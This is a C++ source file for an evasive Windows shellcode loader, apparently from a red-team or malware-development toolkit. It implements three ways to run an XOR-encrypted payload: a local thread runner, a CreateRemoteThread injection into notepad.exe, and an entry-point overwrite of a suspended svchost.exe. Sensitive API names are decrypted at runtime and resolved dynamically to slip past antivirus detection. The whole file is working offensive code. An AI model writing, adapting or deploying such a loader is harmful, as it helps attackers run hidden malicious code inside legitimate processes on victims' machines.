#include "pch.h"
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#pragma comment(lib, "ntdll")
#include "Runners.h"
#include "Globals.h"
#include "Decryptors.h"

// size of buf
unsigned int sBuf = sizeof(buf);

//APIs
//// VirtualProtect
BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
//// VirtualAlloc
LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
//// CreateThread
HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
//// WaitForSingleObject
DWORD(WINAPI* pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
//// OpenProcess
HANDLE(WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
//// VirtualAllocEx
LPVOID(WINAPI* pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
//// WriteProcessMemory
BOOL(WINAPI* pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
//// CreateRemoteThread
HANDLE(WINAPI* pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

// Simple Shellcode Runner (virtualalloc + rtlmovememory + virtualprotect + createthread + waitforsingleobject)
int runner::Runner::Run(void) 
{
	// Allocate buffer for payload
	decryptor::Decryptor::XORDecrypt((char*)VA, sizeof(VA), XORKey, sizeof(XORKey));
	pVirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), VA); // dynamic resolve
	LPVOID pMemory = pVirtualAlloc(0, sBuf, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt buf
	decryptor::Decryptor::XORDecrypt((char*)buf, sizeof(buf), XORKey, sizeof(XORKey));

	// Copy payload to the buffer
	RtlMoveMemory(pMemory, buf, sBuf);

	// Change protection
	DWORD oldProtect = 0;
	decryptor::Decryptor::XORDecrypt((char*)VP, sizeof(VP), XORKey, sizeof(XORKey));
	pVirtualProtect = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), VP);
	BOOL bVP = pVirtualProtect(pMemory, sBuf, PAGE_EXECUTE_READ, &oldProtect);

	if (bVP != 0)
	{
		// execute thread
		decryptor::Decryptor::XORDecrypt((char*)CT, sizeof(CT), XORKey, sizeof(XORKey));
		pCreateThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), CT);
		HANDLE hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)pMemory, 0, 0, 0);

		// dont close
		decryptor::Decryptor::XORDecrypt((char*)WFSO, sizeof(WFSO), XORKey, sizeof(XORKey));
		pWaitForSingleObject = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), WFSO);
		pWaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}
// Process Injection Shellcode Runner (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread + Waitforsingleobject)
int runner::Runner::piRun(void)
{
	// retrieve pid
	int pid = runner::Helper::getPID(L"notepad.exe");

	if (pid)
	{
		// open handle to target proccess
		decryptor::Decryptor::XORDecrypt((char*)OP, sizeof(OP), XORKey, sizeof(XORKey));
		pOpenProcess = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), OP);
		HANDLE hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
		
		// alloc memory buffer on remote process
		decryptor::Decryptor::XORDecrypt((char*)VAE, sizeof(VAE), XORKey, sizeof(XORKey));
		pVirtualAllocEx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), VAE);
		LPVOID pRMemory = pVirtualAllocEx(hProc, NULL, sBuf, MEM_COMMIT, PAGE_EXECUTE_READ);

		// Decrypt buf
		decryptor::Decryptor::XORDecrypt((char*)buf, sizeof(buf), XORKey, sizeof(XORKey));

		// write payload to buffer
		decryptor::Decryptor::XORDecrypt((char*)WPM, sizeof(WPM), XORKey, sizeof(XORKey));
		pWriteProcessMemory = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(GetModuleHandle(L"kernel32.dll"), WPM);
		pWriteProcessMemory(hProc, pRMemory, (PVOID)buf, (SIZE_T)sBuf, (SIZE_T *)NULL);

		// create new thread on remote process
		decryptor::Decryptor::XORDecrypt((char*)CRT, sizeof(CRT), XORKey, sizeof(XORKey));
		pCreateRemoteThread = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), CRT);
		HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRMemory, NULL, 0, NULL);
		
		if (hThread != NULL)
		{
			// wait for thread
			decryptor::Decryptor::XORDecrypt((char*)WFSO, sizeof(WFSO), XORKey, sizeof(XORKey));
			pWaitForSingleObject = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddress(GetModuleHandle(L"kernel32.dll"), WFSO);
			pWaitForSingleObject(hThread, INFINITE);
			return 0;
		}
	}
	return -1;
}

int runner::Runner::epsRun(void) // credits: https://bohops.com/2023/06/09/no-alloc-no-problem-leveraging-program-entry-points-for-process-injection/
{
	// start process 
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CreateProcessA(0, (LPSTR)"C:\\Windows\\System32\\svchost.exe", NULL, NULL, false, 0x4, NULL, 0, &si, &pi);		// TO-DO obfuscate win32 api call

	// Get memory address of primary thread
	ULONG64 threadAddr = 0;
	ULONG retlen = 0;
	NtQueryInformationThread(pi.hThread, (THREADINFOCLASS)9, &threadAddr, sizeof(PVOID), &retlen);
	//printf("Found primary thread start address: %I64x\n", threadAddr);

	// Decrypt buf
	decryptor::Decryptor::XORDecrypt((char*)buf, sizeof(buf), XORKey, sizeof(XORKey));

	// Overwrite memory address of thread with our shellcode
	WriteProcessMemory(pi.hProcess, (LPVOID)threadAddr, buf, sBuf, NULL);

	// resume thread
	ResumeThread(pi.hThread);

	return 0;
}

// Get PID for process injection
int runner::Helper::getPID(const wchar_t* procname)                                                                // TO-DO Obfuscate apis: CreateToolhelp32Snapshot, CloseHandle, lstrcmpiW
{
	int pid = 0;
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;

	// take snapshot of all processes
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcSnap == INVALID_HANDLE_VALUE)
	{
		//std::cout << "CreateToolhelp32Snapshot (of processes) failed with error " << GetLastError() << std::endl;
		return 0;
	}
	// define size
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcSnap, &pe32))
	{
		//std::cout << "Failed getting first process" << std::endl;
		CloseHandle(hProcSnap);
		return 0;
	}
	// std::cout << "Process: " << pe32.szExeFile << std::endl;
	while (Process32Next(hProcSnap, &pe32))
	{
		if (lstrcmpiW(procname, pe32.szExeFile) == 0)
		{
			pid = pe32.th32ProcessID;
			break;
		}
	}
	CloseHandle(hProcSnap);
	return pid;
}